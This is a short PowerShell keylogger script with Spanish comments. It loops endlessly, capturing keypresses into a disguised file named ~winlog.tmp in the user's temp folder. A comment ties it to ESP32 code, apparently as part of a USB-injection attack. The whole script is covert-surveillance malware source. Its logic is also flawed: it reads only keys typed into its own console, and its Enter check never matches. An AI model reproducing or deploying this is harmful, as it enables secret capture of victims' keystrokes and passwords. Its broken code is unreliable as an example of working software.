# keylogger.ps1
# Ruta donde se guardarán los logs. Debe ser la misma que en el código del ESP32.
$LogFile = "C:\Users\$env:USERNAME\AppData\Local\Temp\~winlog.tmp"

# Bucle infinito para mantener el keylogger corriendo
while ($true) {
    # Comprueba si se ha pulsado una tecla
    if ([console]::KeyAvailable) {
        $key = [console]::ReadKey($true).KeyChar.ToString().ToLower()
        
        # Añade la tecla pulsada al archivo de logs
        # -NoNewline para que no se añadan saltos de línea innecesarios
        Add-Content $LogFile $key -NoNewline
        
        # Si se pulsa Enter, añade un salto de línea legible
        if ($key -eq "enter") {
            Add-Content $LogFile "`r`n" -NoNewline
        }
    }
    # Pequeña pausa para no consumir excesivo CPU
    Start-Sleep -Milliseconds 50
}
